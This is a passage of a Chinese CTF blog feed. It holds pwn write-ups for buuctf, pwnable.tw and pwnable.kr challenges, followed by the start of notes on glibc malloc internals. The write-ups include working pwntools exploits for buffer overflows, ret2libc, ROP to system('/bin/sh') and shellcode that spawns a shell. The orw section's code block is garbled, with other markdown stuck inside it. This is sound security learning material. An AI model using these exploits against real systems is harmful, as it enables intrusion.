title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h1><p>标准流程就不重复了,这题单看题不难,但坑是一个接着一个</p><p>第一个坑,ida显示的v4距返回地址计算出来应该是60,但是实际去gdb调试会发现应该是56,之前做了那么多题都是直接用ida给的数据,这次突然跳出来一个不准的确实很搞人（主要这题栈帧不是常见的类型）,也算得到了一个教训,最好还是gdb实操计算偏移,当然直接去读汇编代码也能得出正确结果</p><p>第二个大坑,就是这题没有设置setbuf(stdout，0)，所以本题的输出是缓存在服务器本地的，换句话说：如果程序不正常退出，本地是不会有输出的,所以必须要正常退出,其实这也应该是第一题我没能接收信息卡住的原因</p><p>更多可见基础杂烩篇</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27423</span>)</span><br><span class="line">backdoor=<span class="number">0x080489A0</span></span><br><span class="line">exit= <span class="number">0x0804E6A0</span>  <span class="comment">#很重要</span></span><br><span class="line">a1=<span class="number">0x308CD64F</span></span><br><span class="line">a2=<span class="number">0x195719D1</span></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span>+p32(backdoor)+p32(exit)+p32(a1)+p32(a2))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h2><p>保护开了got表不可写以及nx</p><p>ida查看</p><p>主体是<img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-29_220445.png" alt=""></p><p>向buf中读入了一个随机数</p><p>下面两个函数依次是</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-29_220426.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-29_220452.png" alt=""></p><p>这里有两个不大熟悉的函数,原型及功能分别是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strncmp</span>(<span class="type">const</span> <span class="type">char</span> *str1,<span class="type">const</span> cahr *str2,<span class="type">size_t</span> n)</span><br><span class="line">将str1与str2比较,最多比较前n个字节</span><br><span class="line"><span class="built_in">sprintf</span>(<span class="type">char</span> *<span class="built_in">string</span>,<span class="type">char</span> *format,arg_list);</span><br><span class="line">将格式化字符串format打印并送入<span class="built_in">string</span>字符串,arg_list是参数列表</span><br></pre></td></tr></table></figure><p>可以看到最后一个函数的读入字节数由第二个函数的返回值决定,</p><p>细看第二个函数,将s与buf比较,s中存的是随机数,肯定猜不到,这里也没有办法能够泄露或改写它,那么只能令v1等于0,即比较0个字节是否相同,那必然是相等的,要使v1等于0,只要buf开头是\0就行了,最后返回的是buf第8个字节</p><p>之后这题没有后门函数也没有binsh,那就是libc泄露类题目</p><p>最终exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">e=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">puts_plt=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr=e.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">p=remote()</span><br><span class="line">p.sendline(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\xFF&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">235</span>+p32(puts_plt)+p32(<span class="number">0x08048825</span>)+p32(puts_got))</span><br><span class="line">puts=u32(p.recv()[-<span class="number">5</span>:-<span class="number">1</span>])  <span class="comment">#调用的是puts会自动在输出末尾加上换行注意过滤，这里其实直接p.recv(4)就行了</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts))</span><br><span class="line">libc_base=puts-libc.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">system=libc_base+libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh=libc_base+libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()  <span class="comment">#搜索已加载的C标准库中/bin/sh字符串的内存地址，并使用.__next__()方法来检索在库中找到的该字符串的第一个内存地址。</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\xFF&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">235</span>+p32(system)+p32(<span class="number">0</span>)+p32(binsh))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>离大谱,自己泄露出来的libc怎么也打不通,最后发现题目给了libc🤡</p><p>细心的可能发现了</p><p>main_addr=e.symbols[‘__libc_start_main’]</p><p>这一句根本没用上</p><p>因为找不到main的symbols</p><p>所以我本来是打算用__libc_start_main作第一次rop的返回地址,但可以发现后面并没有使用它,因为这么做是打不通的,至于为什么</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-29_232747.png" alt=""></p><p><strong>__libc_start_main是需要参数的</strong></p><p>脑子短路了</p><p>因为这个硬生生被卡住了半个小时</p><p>也算吃了个教训,以后<strong>返回地址不能用__libc_start_main</strong></p><p><u>(之所以我会这么做,是因为我记岔了,__libc_start_main是可以用来做被泄露的函数,但我记成可以做返回地址了)</u></p><h1 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a>jarvisoj_level2_x64</h1><p>与jarvisoj_level2一样只不过变成了64位，注意参数传递方式即可</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28252</span>)</span><br><span class="line">pop_rdi_ret=<span class="number">0x00000000004006b3</span></span><br><span class="line">binsh=<span class="number">0x600A90</span></span><br><span class="line">system=<span class="number">0x400603</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">136</span>+p64(pop_rdi_ret)+p64(binsh)+p64(system))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="HarekazeCTF2019-baby-rop"><a href="#HarekazeCTF2019-baby-rop" class="headerlink" title="[HarekazeCTF2019]baby_rop"></a>[HarekazeCTF2019]baby_rop</h1><p>和上一题一模一样</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26832</span>)</span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000400683</span></span><br><span class="line">binsh=<span class="number">0x601048</span></span><br><span class="line">system=<span class="number">0x4005E3</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+p64(pop_rdi_ret)+p64(binsh)+p64(system))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 题解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable刷题记录</title>
      <link href="/posts/10836/"/>
      <url>/posts/10836/</url>
      
        <content type="html"><![CDATA[<h1 id="pwnable-tw"><a href="#pwnable-tw" class="headerlink" title="pwnable.tw"></a>pwnable.tw</h1><h2 id="start"><a href="#start" class="headerlink" title="start"></a>start</h2><p>第一步检查保护,是久违的感觉😂</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-20_082554.png" alt=""></p><hr><p>ida打开看看</p><p>不难发现其不是标准栈帧结构,🔒以ida反汇编不了(百度可以搜索解决办法),好在不长直接看汇编代码吧.</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-20_091524.png" alt=""></p><p>程序主体是两个系统调用read和write,其中read读取60个字节明显有溢出,但要怎么利用是关键</p><p>首选自然是ret2shellcode了,但ret2shellcode需要栈地址,可以看到程序起始有向栈中压入esp,我们可以选择借用write系统调用将其泄露,剩下的就是常规操作了</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10000</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x14</span>+p32(<span class="number">0x8048087</span>))</span><br><span class="line">stack=u32(p.recv(<span class="number">4</span>))+<span class="number">0x14</span> <span class="comment">#加14是因为最后又抬高了esp一次</span></span><br><span class="line">p.recv()</span><br><span class="line">sh=<span class="string">b&quot;\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x14</span>+p32(stack)+sh)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-201.png" alt=""></p><h2 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h2><p>保护</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/orw&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>沙盒题,getshell是很难做到的</p><p>程序的内容十分简单,比上一题还简单</p><p>但是因为orw的缘故也不白给</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwnable.kr</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## fd</span></span><br><span class="line"></span><br><span class="line">ssh连上之后，ls发现三个有效文件fd,fd.c,flag</span><br><span class="line"></span><br><span class="line">![](https://cdn.jsdelivr.net/gh/ixout/picture@main/img/<span class="number">2023</span>-03-<span class="number">20_220727.</span>png)</span><br><span class="line"></span><br><span class="line">flag没有任何权限向我们开放</span><br><span class="line"></span><br><span class="line">再看fd.c</span><br><span class="line"></span><br><span class="line">```c</span><br><span class="line">fd@pwnable:~$ cat fd.c</span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line">char buf[<span class="number">32</span>];</span><br><span class="line"><span class="built_in">int</span> main(<span class="built_in">int</span> argc, char* argv[], char* envp[])&#123;</span><br><span class="line"><span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">printf(<span class="string">&quot;pass argv[1] a number\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line"><span class="built_in">int</span> <span class="built_in">len</span> = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">len</span> = read(fd, buf, <span class="number">32</span>);</span><br><span class="line"><span class="keyword">if</span>(!strcmp(<span class="string">&quot;LETMEWIN\n&quot;</span>, buf))&#123;</span><br><span class="line">printf(<span class="string">&quot;good job :)\n&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">printf(<span class="string">&quot;learn about Linux file IO\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码问题不大,考验的就是对linux系统read函数最基本的了解了,0是标准输入,使fd为0即可,0x1234转换为十进制即是4660</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fd 4660</span><br></pre></td></tr></table></figure><ul><li>atoi()：atoi()函数会扫描参数 str 字符串，跳过前面的空白字符（例如空格，tab 缩进等，可以通过 isspace() 函数来检测），直到遇上数字或正负符号才开始做转换，而再遇到非数字或字符串结束时(‘\0’)才结束转换，并将结果返回，返回转换后的整型数；如果 str 不能转换成 int 或者 str 为空字符串，那么将返回 0。</li></ul><hr><h2 id="collision"><a href="#collision" class="headerlink" title="collision"></a>collision</h2><p>连上后三个文件,文件样式和权限和上一题一样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">check_password</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* p)</span>&#123;</span><br><span class="line"><span class="type">int</span>* ip = (<span class="type">int</span>*)p;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="type">int</span> res=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">res += ip[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;usage : %s [passcode]\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;passcode length should be 20 bytes\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;wrong passcode.\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>c语言基础不牢,char* a[]知道是由字符指针组成的数组,但一时竟不知道每一个成员还可以代表指向一个字符串</p><p>输入要为20个字节(字符),以16进制存储,进入check函数,会被强制转为int*指针,即输入的20个字符被视为了5个int数</p><p>现在就是要想办法构造出hashcode了,这里构造四处查了一些资料,有两种办法</p><ol><li>全部用可打印字符表示,好处是直观,但要计算有点麻烦</li><li>无论是否可见用十六进制ascii码表示,好处是基本没有计算量,但直接输入十六进制数据依然会被视作字符,所以需要用到python</li></ol><p>我选择用第二种方法(因为第一种要控制可打印字符大麻烦了)</p><p>键入(别忘了小端序)</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./col $(python -c <span class="string">&#x27;print &quot;\x01&quot;*16+&quot;\xe8\x05\xd9\x1d&quot;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>前面的16字节我一开始还打算用\x00填充,还想怎么老是提示长度不够,结果忘了strlen()测量长度到\x00结束</p><h2 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h2><p>是熟悉的味道</p><p>检查保护</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-21_163931.png" alt=""></p><p>ida看一看</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-21_163837.png" alt=""></p><p>a1是这个函数的参数,也就是在返回地址上一个</p><p>使a1的值为-889275714,我还傻乎乎的打算去用补码换算成十六进制,结果发现汇编代码中就有直接的十六进制数据0CAFEBABEh</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&quot;pwnable.kr&quot;</span>,<span class="number">9000</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">52</span>+<span class="string">b&#x27;\xbe\xba\xfe\xca&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p>给了一个flag文件，ida打开提示upx加壳，脱壳后flag以明文形式存在</p>]]></content>
      
      
      <categories>
          
          <category> 题解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> pwnable.tw </tag>
            
            <tag> 刷题记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆学习笔记-2</title>
      <link href="/posts/40023/"/>
      <url>/posts/40023/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第一篇堆学习笔记主要还是基础性的知识要多一点，像malloc和free的流程都只是贴了张图，这篇文章则稍微更深入一点点。</p><h1 id="无tcache"><a href="#无tcache" class="headerlink" title="无tcache"></a>无tcache</h1><h2 id="malloc初始化"><a href="#malloc初始化" class="headerlink" title="malloc初始化"></a>malloc初始化</h2><p>malloc的入口是是_libc_malloc:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>* __libc_malloc (<span class="type">size_t</span> bytes) &#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim;</span><br><span class="line">  <span class="comment">// First part: callback</span></span><br><span class="line">  <span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">  <span class="comment">// Second part  </span></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">// Third part</span></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从代码可以看出，主要包含<strong>callback、arena_get、_int_malloc</strong>这几步，我们把<strong>callback和arena_get当作初始化</strong>的过程，_<strong>int_malloc作为实际分配</strong>的过程，本文着重来看初始化的过程，下篇文章再看_int_malloc。</p><p>再额外说一下builtin_expect，它是gcc的扩展，用来允许程序员将最有可能执行的分支告诉编译器，这样编译器就可以对分支预测做一些优化，简单来讲就是在遇到分支的时候，先生成大概率分支的指令，这样指令cache的命中率会变高，具体细节可以参考gcc的官方文档（以GCC10.1为例：<a href="https://gcc.gnu.org/onlinedocs/gcc-10.1.0/gcc/Other-Builtins.html#Other-Builtins），有时也会将__builtin_expect指令封装为likely和unlikely宏，它们的定义如下所示：">https://gcc.gnu.org/onlinedocs/gcc-10.1.0/gcc/Other-Builtins.html#Other-Builtins），有时也会将__builtin_expect指令封装为likely和unlikely宏，它们的定义如下所示：</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __builtin_expect(expr, val) (expr)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> likely(expr) __builtin_expect(!!(expr), 1) <span class="comment">//expr很可能为真</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unlikely(expr) __builtin_expect(!!(expr), 0) <span class="comment">//expr很可能为假</span></span></span><br></pre></td></tr></table></figure><h3 id="callback"><a href="#callback" class="headerlink" title="callback"></a>callback</h3><p>先看前面代码1中的first part，如下两句，第一句是给函数指针变量赋值，第二句是函数调用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br></pre></td></tr></table></figure><p>hook是一个函数指针变量，被赋值成了__malloc_hook，后者定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">weak_variable</span> <span class="params">(*__malloc_hook)</span></span><br><span class="line">  <span class="params">(<span class="type">size_t</span> __size, <span class="type">const</span> <span class="type">void</span> *)</span> = malloc_hook_ini;</span><br></pre></td></tr></table></figure><p>__malloc_hook被初始化成了malloc_hook_ini，后者定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">malloc_hook_ini</span> <span class="params">(<span class="type">size_t</span> sz, <span class="type">const</span> <span class="type">void</span> *caller)</span> &#123;</span><br><span class="line">  __malloc_hook = <span class="literal">NULL</span>;</span><br><span class="line">  ptmalloc_init ();</span><br><span class="line">  <span class="keyword">return</span> __libc_malloc (sz);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里<strong>malloc_hook又被赋值成了NULL，然后再重新调用</strong>libc_malloc，这样就可以保证在多次调用__libc_malloc的情况下，代码1中的hook回调函数只会被调用一次，如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-18_170117.png" alt=""></p><p>这个函数里的ptmalloc_init的精简定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">ptmalloc_init</span> <span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (__malloc_initialized &gt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  __malloc_initialized = <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">  thread_arena = &amp;main_arena;</span><br><span class="line">  malloc_init_state (&amp;main_arena);</span><br><span class="line">  </span><br><span class="line">  __malloc_initialized = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到通过__malloc_initialized这个全局flag来检测是不是已经初始化过了，如果没有，则把main_arena设成当前的thread_arena，这是因为初始化肯定是主线程在做，而主线程用的是main_arena，然后再调用malloc_init_state进一步初始化，malloc_init_state定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">malloc_init_state</span> <span class="params">(mstate av)</span> &#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  mbinptr bin;</span><br><span class="line">  <span class="comment">// part1</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; NBINS; ++i) &#123;</span><br><span class="line">      bin = bin_at (av, i);</span><br><span class="line">      bin-&gt;fd = bin-&gt;bk = bin;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// part2</span></span><br><span class="line">  <span class="keyword">if</span> (av == &amp;main_arena)</span><br><span class="line">    set_max_fast(DEFAULT_MXFAST);</span><br><span class="line">  av-&gt;top = initial_top (av);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>malloc_init_state的part1把malloc_state中的bins array初始化成了下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-18_170451.png" alt=""></p><p>malloc_init_state的part2把malloc_state中的top初始化成了指向上图2中的bin1，修改top后如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-18_170512.png" alt=""></p><h3 id="arena-get"><a href="#arena-get" class="headerlink" 